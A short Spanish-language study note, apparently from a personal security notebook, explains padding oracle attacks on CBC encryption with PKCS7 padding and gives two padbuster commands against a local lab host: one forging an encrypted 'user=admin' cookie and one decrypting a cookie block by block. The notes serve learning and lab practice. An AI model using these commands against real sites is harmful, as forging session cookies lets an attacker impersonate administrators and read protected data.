___
- tags: #padding_oracle_attack #pkcs7 #cbc #owasp 
___
Es un tipo de ataque contra datos cifrados que permite al atacante descifrar el contenido de los datos sin conocer la clave.
## Oráculo
Un oraculo hace referencia a una "indicación" que brinda a un atacante información sobre si la acción que ejecuta es correcta o no. 
## Padding/Relleno
Es un término criptográfico específico. Algunos cifrados, que son los algoritmos que se usan para cifrar datos, funcionan en **bloques de datos** en los que cada bloque tiene un tamaño fijo.
Si los datos no tienen el tamaño adecuado para rellenar los bloques, se rellenan automáticamente hasta que lo hacen.
![[Pasted image 20250925162552.png]]
### Herramienta
```shell
## Para cifrar el texto 'user=admin'
padbuster http://192.168.1.7/index.php UWi5uqpx%2BfapzEz98Ewsy2n5oB%2FROVbz 8 -cookies auth=UWi5uqpx%2BfapzEz98Ewsy2n5oB%2FROVbz -plaintext 'user=admin'
```

```shell
## Para desencriptar por bloques
padbuster http://192.168.1.7/index.php UWi5uqpx%2BfapzEz98Ewsy2n5oB%2FROVbz 8 -cookies auth=UWi5uqpx%2BfapzEz98Ewsy2n5oB%2FROVbz 
```
